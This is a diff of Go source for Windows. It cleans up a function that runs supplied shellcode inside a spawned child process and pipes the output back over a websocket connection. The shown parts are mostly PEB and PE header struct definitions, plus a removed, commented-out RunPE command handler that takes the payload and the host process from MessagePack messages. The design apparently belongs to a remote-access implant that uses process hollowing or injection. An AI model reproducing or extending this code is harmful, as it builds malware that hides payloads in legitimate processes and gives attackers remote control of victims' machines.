@@ -14,21 +14,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// func RunPE(unmsgpack MessagePack.MsgPack, Connection *wsc.Wsc) string {
-// 	var prog string
-// 	if runtime.GOARCH == "amd64" {
-// 		prog = unmsgpack.ForcePathObject("Process64").GetAsString()
-// 	} else {
-// 		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
-// 	}
-// 	//fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
-// 	stdOut, stdErr := RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, "-w "+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
-// 	if stdOut == "" {
-// 		return stdErr
-// 	}
-// 	return stdOut
-// }
-
 func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connection *wsc.Wsc) (stdOut, stdErr string) {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
@@ -112,36 +97,27 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 
 	type PEB struct {
 		//reserved1              [2]byte     // BYTE 0-1
-		InheritedAddressSpace    byte    // BYTE	0
-		ReadImageFileExecOptions byte    // BYTE	1
-		BeingDebugged            byte    // BYTE	2
-		reserved2                [1]byte // BYTE 3
-		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
-		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
-		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
-		// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
-		// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
-		// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
-		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
-		// SpareBit                     : 1;   //0x0003:7
-		//reserved3              [2]uintptr  // PVOID BYTE 4-8
-		Mutant                 uintptr     // BYTE 4
-		ImageBaseAddress       uintptr     // BYTE 8
-		Ldr                    uintptr     // PPEB_LDR_DATA
-		ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
-		reserved4              [3]uintptr  // PVOID
-		AtlThunkSListPtr       uintptr     // PVOID
-		reserved5              uintptr     // PVOID
-		reserved6              uint32      // ULONG
-		reserved7              uintptr     // PVOID
-		reserved8              uint32      // ULONG
-		AtlThunkSListPtr32     uint32      // ULONG
-		reserved9              [45]uintptr // PVOID
-		reserved10             [96]byte    // BYTE
-		PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
-		reserved11             [128]byte   // BYTE
-		reserved12             [1]uintptr  // PVOID
-		SessionId              uint32      // ULONG
+		InheritedAddressSpace    byte        // BYTE	0
+		ReadImageFileExecOptions byte        // BYTE	1
+		BeingDebugged            byte        // BYTE	2
+		reserved2                [1]byte     // BYTE 3
+		Mutant                   uintptr     // BYTE 4
+		ImageBaseAddress         uintptr     // BYTE 8
+		Ldr                      uintptr     // PPEB_LDR_DATA
+		ProcessParameters        uintptr     // PRTL_USER_PROCESS_PARAMETERS
+		reserved4                [3]uintptr  // PVOID
+		AtlThunkSListPtr         uintptr     // PVOID
+		reserved5                uintptr     // PVOID
+		reserved6                uint32      // ULONG
+		reserved7                uintptr     // PVOID
+		reserved8                uint32      // ULONG
+		AtlThunkSListPtr32       uint32      // ULONG
+		reserved9                [45]uintptr // PVOID
+		reserved10               [96]byte    // BYTE
+		PostProcessInitRoutine   uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
+		reserved11               [128]byte   // BYTE
+		reserved12               [1]uintptr  // PVOID
+		SessionId                uint32      // ULONG
 	}
 
 	// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
@@ -277,43 +253,6 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 		return
 	}
 
-	// Read the child process's PE optional header to find it's entry point
-	/*
-		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64
-		typedef struct _IMAGE_OPTIONAL_HEADER64 {
-		WORD                 Magic;
-		BYTE                 MajorLinkerVersion;
-		BYTE                 MinorLinkerVersion;
-		DWORD                SizeOfCode;
-		DWORD                SizeOfInitializedData;
-		DWORD                SizeOfUninitializedData;
-		DWORD                AddressOfEntryPoint;
-		DWORD                BaseOfCode;
-		ULONGLONG            ImageBase;
-		DWORD                SectionAlignment;
-		DWORD                FileAlignment;
-		WORD                 MajorOperatingSystemVersion;
-		WORD                 MinorOperatingSystemVersion;
-		WORD                 MajorImageVersion;
-		WORD                 MinorImageVersion;
-		WORD                 MajorSubsystemVersion;
-		WORD                 MinorSubsystemVersion;
-		DWORD                Win32VersionValue;
-		DWORD                SizeOfImage;
-		DWORD                SizeOfHeaders;
-		DWORD                CheckSum;
-		WORD                 Subsystem;
-		WORD                 DllCharacteristics;
-		ULONGLONG            SizeOfStackReserve;
-		ULONGLONG            SizeOfStackCommit;
-		ULONGLONG            SizeOfHeapReserve;
-		ULONGLONG            SizeOfHeapCommit;
-		DWORD                LoaderFlags;
-		DWORD                NumberOfRvaAndSizes;
-		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
-		} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
-	*/
-
 	type IMAGE_OPTIONAL_HEADER64 struct {
 		Magic                       uint16
 		MajorLinkerVersion          byte
@@ -346,43 +285,6 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 		NumberOfRvaAndSizes         uint32
 		DataDirectory               uintptr
 	}
-
-	/*
-		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
-		typedef struct _IMAGE_OPTIONAL_HEADER {
-		WORD                 Magic;
-		BYTE                 MajorLinkerVersion;
-		BYTE                 MinorLinkerVersion;
-		DWORD                SizeOfCode;
-		DWORD                SizeOfInitializedData;
-		DWORD                SizeOfUninitializedData;
-		DWORD                AddressOfEntryPoint;
-		DWORD                BaseOfCode;
-		DWORD                BaseOfData;
-		DWORD                ImageBase;
-		DWORD                SectionAlignment;
-		DWORD                FileAlignment;
-		WORD                 MajorOperatingSystemVersion;
-		WORD                 MinorOperatingSystemVersion;
-		WORD                 MajorImageVersion;
-		WORD                 MinorImageVersion;
-		WORD                 MajorSubsystemVersion;
-		WORD                 MinorSubsystemVersion;
-		DWORD                Win32VersionValue;
-		DWORD                SizeOfImage;
-		DWORD                SizeOfHeaders;
-		DWORD                CheckSum;
-		WORD                 Subsystem;
-		WORD                 DllCharacteristics;
-		DWORD                SizeOfStackReserve;
-		DWORD                SizeOfStackCommit;
-		DWORD                SizeOfHeapReserve;
-		DWORD                SizeOfHeapCommit;
-		DWORD                LoaderFlags;
-		DWORD                NumberOfRvaAndSizes;
-		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
-		} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
-	*/
 
 	type IMAGE_OPTIONAL_HEADER32 struct {
 		Magic                       uint16
